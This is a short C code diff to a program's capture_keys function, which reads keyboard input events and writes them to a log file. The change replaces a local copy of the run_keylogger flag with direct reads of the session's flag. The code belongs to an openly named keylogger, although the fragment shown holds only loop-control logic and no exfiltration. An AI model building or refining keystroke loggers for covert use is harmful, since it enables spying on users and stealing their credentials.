@@ -336,7 +336,6 @@ int verify_device(const int fd) {
 void * capture_keys(void * arg) {
     struct session_info * session_info = arg;
     char * device_path = session_info->device_path;
-    _Atomic int run_keylogger = session_info->run_keylogger;
 
     if (device_path == NULL) {
         log_message("Device path is null");
@@ -377,7 +376,7 @@ void * capture_keys(void * arg) {
     fprintf(log_file, "==================================================================================\n");
     fflush(log_file);
 
-    while (run_keylogger) {
+    while (session_info->run_keylogger) {
         FD_ZERO(&readfds);
         FD_SET(fd, &readfds);
 
@@ -475,8 +474,6 @@ void * capture_keys(void * arg) {
                     value_to_string(ev.type, ev.code, ev.value));
             fflush(log_file);
         }
-
-        run_keylogger = session_info->run_keylogger;
     }
 
     close(fd);
